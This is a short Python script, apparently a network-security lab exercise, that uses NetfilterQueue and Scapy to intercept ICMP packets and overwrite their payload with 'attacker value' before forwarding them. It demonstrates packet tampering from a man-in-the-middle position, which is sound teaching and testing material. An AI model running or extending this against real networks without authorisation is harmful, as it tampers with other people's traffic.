from netfilterqueue import NetfilterQueue
from scapy.all import IP, ICMP, Raw

def recalculate(pkt):
    """
    Recalcula los campos de longitud y checksum del paquete IP e ICMP.
    """
    if IP in pkt:
        del pkt[IP].len
        del pkt[IP].chksum
    if ICMP in pkt:
        del pkt[ICMP].chksum

    pkt = pkt.__class__(bytes(pkt))
    return pkt

def intercept(packet):
    """
    Intercepta y modifica los paquetes ICMP, cambiando su payload.
    """
    try:
        payload = packet.get_payload()
        spkt = IP(payload)

        print("Ha llegado un nuevo paquete")

        # Si el paquete tiene ICMP, mostramos info detallada
        if spkt.haslayer(ICMP):
            # Si tiene capa Raw, mostramos los datos originales y los modificamos
            if spkt.haslayer(Raw):
                print("Datos originales: ", repr(spkt[Raw].load))
                spkt[Raw].load = b"attacker value"

                # Recalcular campos solo si modificamos algo
                spkt = recalculate(spkt)

            # Mostrar SIEMPRE el paquete completo cuando hay ICMP
            spkt.show()
        else:
            # Si no es ICMP, al menos mostramos un resumen
            print(spkt.summary())

        # Reenviar el paquete (modificado o no)
        packet.set_payload(bytes(spkt))
        packet.accept()

    except Exception as e:
        print("[!] Error procesando paquete:", e)
        try:
            packet.accept()
        except Exception:
            pass

if __name__ == "__main__":
    nfqueue = NetfilterQueue()
    nfqueue.bind(1, intercept)

    try:
        print("Escaneando paquetes de manera activa...")
        nfqueue.run()
    except KeyboardInterrupt:
        print("\nSaliendo por KeyboardInterrupt...")
    finally:
        nfqueue.unbind()